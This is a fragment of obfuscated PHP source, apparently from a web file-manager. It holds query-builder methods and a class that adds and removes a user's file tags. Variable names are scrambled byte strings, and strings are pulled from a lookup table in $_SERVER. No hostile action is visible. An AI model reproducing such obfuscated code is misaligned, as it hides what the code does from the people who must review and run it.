$ƒª•Ö¹Ô[1069], $ƒª•Ö¹Ô[1070], $ƒª•Ö¹Ô[1071], $ƒª•Ö¹Ô[1072], $ƒª•Ö¹Ô[1073], $ƒª•Ö¹Ô[1074], $ƒª•Ö¹Ô[1075], $ƒª•Ö¹Ô[1076]), array($this->parseTable("{$×£ÜşÏì[$ƒª•Ö¹Ô[332]]}"), $this->parseDistinct(isset($×£ÜşÏì[$ƒª•Ö¹Ô[1077]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[1077]] : !1), $this->parseField(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[326]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[326]] : $ƒª•Ö¹Ô[213]), $this->parseJoin(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[335]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[335]] : $ƒª•Ö¹Ô[12]), $this->parseWhere(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[328]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[328]] : $ƒª•Ö¹Ô[12]), $this->parseGroup(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[557]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[557]] : $ƒª•Ö¹Ô[12]), $this->parseHaving(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[1078]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[1078]] : $ƒª•Ö¹Ô[12]), $this->parseOrder(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[418]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[418]] : $ƒª•Ö¹Ô[12]), $this->parseLimit(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[345]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[345]] : $ƒª•Ö¹Ô[12]), $this->parseUnion(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[400]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[400]] : $ƒª•Ö¹Ô[12]), $this->parseComment(!empty($×£ÜşÏì[$ƒª•Ö¹Ô[407]]) ? $×£ÜşÏì[$ƒª•Ö¹Ô[407]] : $ƒª•Ö¹Ô[12])), $²ÍßôÇƒ); return $²ÍßôÇƒ; } public function getLastSql($¼íÍµ« = '') { return $¼íÍµ« ? $this->modelSql[$¼íÍµ«] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¯ĞÊÍ”ô) { return addslashes($¯ĞÊÍ”ô); } public function setModel($ïºòà˜ö) { $this->model = $ïºòà˜ö; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto cØÈÊµÏˆÕ; c×Î¨ÂËÊ : class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($¬–´Û’³) { $«ŞÕ¸‚Î =& $_SERVER[–Ú¬çÁ]; return array($«ŞÕ¸‚Î[1975] => array($«ŞÕ¸‚Î[2364] . USER_ID, $«ŞÕ¸‚Î[1976])); } protected function listData() { $Î¹È­· =& $_SERVER[–Ú¬çÁ]; $‹Êšì­é = array($Î¹È­·[1657] => USER_ID, $Î¹È­·[535] => array($Î¹È­·[1979], 0)); $§ª°ÛÆ¯ = $Î¹È­·[2365]; $àÁà‚ö = $this->field($§ª°ÛÆ¯)->where($‹Êšì­é)->order($Î¹È­·[1982])->select(); return $àÁà‚ö ? $àÁà‚ö : array(); } protected function addToTag($øñ‡‹¬Ÿ, $‹¢Ì”…) { $‰ßÛÄ’¢ =& $_SERVER[–Ú¬çÁ]; if (!Model($‰ßÛÄ’¢[2124])->listData($‹¢Ì”…)) { return !1; } if (is_numeric($øñ‡‹¬Ÿ)) { $Å•ºöê¬ = Model($‰ßÛÄ’¢[845])->pathInfo($øñ‡‹¬Ÿ); if (!$Å•ºöê¬) { return !1; } } else { $Å•ºöê¬ = IO::infoSimple($øñ‡‹¬Ÿ); if (!$Å•ºöê¬) { return !1; } $Ïâ”ç²± = $Å•ºöê¬[$‰ßÛÄ’¢[32]]; $²•ŒİÜÒ = $Å•ºöê¬[$‰ßÛÄ’¢[33]]; if (isset($Å•ºöê¬[$‰ßÛÄ’¢[462]])) { $²•ŒİÜÒ = $Å•ºöê¬[$‰ßÛÄ’¢[462]] == $‰ßÛÄ’¢[88] ? $‰ßÛÄ’¢[75] : $‰ßÛÄ’¢[224]; } } $„ƒÑæ = array($‰ßÛÄ’¢[1657] => USER_ID, $‰ßÛÄ’¢[535] => $‹¢Ì”…, $‰ßÛÄ’¢[472] => $øñ‡‹¬Ÿ, $‰ßÛÄ’¢[473] => $²•ŒİÜÒ ? $²•ŒİÜÒ : $‰ßÛÄ’¢[467], $‰ßÛÄ’¢[471] => $Ïâ”ç²± ? $Ïâ”ç²± : $‰ßÛÄ’¢[12], $‰ßÛÄ’¢[1868] => 0); if ($this->where($„ƒÑæ)->find()) { return !1; } return $this->add($„ƒÑæ); } protected function removeFromTag($ÍÌÇ“À, $÷î‡ á) { $É»ÀÓ•‡ =& $_SERVER[–Ú¬çÁ]; if (!Model($É»ÀÓ•‡[2124])->listData($÷î‡ á)) { return !1; } if (is_array($ÍÌÇ“À)) { $ÍÌÇ“À = array($É»ÀÓ•‡[7], $ÍÌÇ“À); } $¡¼¥æÀ¸ = array($É»ÀÓ•‡[1657] => USER_ID, $É»ÀÓ•‡[535] => $÷î‡ á, $É»ÀÓ•‡[472] => $ÍÌÇ“À); return $this->where($¡¼¥æÀ¸)->delete(); } protected function removeByTag($Œéàú‡¾) { $òÑ’½ì =& $_SERVER[–Ú¬çÁ]; if (!$Œéàú‡¾) { return !1; } $†Ô¾É† = array($òÑ’½ì[1657] => USER_ID, $òÑ’½ì[535] => $Œéàú‡¾); return $this->where($†Ô¾É†)->delete(); } protected function removeBySource($Âí‚‘ïÉ) { $ÔÏÕŸŸ =& $_SERVER[–Ú¬çÁ]; if (is_array($Âí‚‘ïÉ)) { $Âí‚‘ïÉ = array($ÔÏÕŸŸ[7], $Âí‚‘ïÉ); } $†­ÌÚ¿© = array($ÔÏÕŸŸ[1657] => USER_ID, $ÔÏÕŸŸ[535] => array($ÔÏÕŸŸ[1034], 0), $ÔÏÕŸŸ[472] => $Âí‚‘ïÉ); return $this->where($†­ÌÚ¿©)->delete(); } }